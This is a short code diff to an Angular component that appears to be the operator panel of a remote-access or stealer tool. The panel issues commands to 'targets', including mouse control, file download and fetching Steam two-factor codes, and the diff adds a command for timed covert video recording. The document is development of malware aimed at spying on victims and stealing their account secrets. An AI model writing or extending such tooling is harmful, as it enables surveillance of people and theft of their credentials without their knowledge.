@@ -13,6 +13,7 @@ export class CommandsAllComponent implements OnInit {
   mouseFormAll!: FormGroup
   recordFormAll!: FormGroup
   downloadFormAll!: FormGroup
+  videoRecordFormAll!: FormGroup
   path: string = ""
 
   @Input() targets$!: Array<Target>
@@ -32,6 +33,11 @@ export class CommandsAllComponent implements OnInit {
 
     this.downloadFormAll = this.fb.group({
       path: ['', [Validators.required, Validators.minLength(6)]],
+    })
+
+    this.videoRecordFormAll = this.fb.group({
+      timeAmount: ['', [Validators.required, Validators.min(1), this.timeControlValidation]],
+      timeUnits: ['s']
     })
   }
 
@@ -70,6 +76,9 @@ export class CommandsAllComponent implements OnInit {
       case 'getSteam2fa':
         this.wrocsid.getSteam2fa(identifier)
         break;
+        case 'videoRecord':
+          this.wrocsid.videoRecord(identifier, args)
+          break;
     }
   }
 
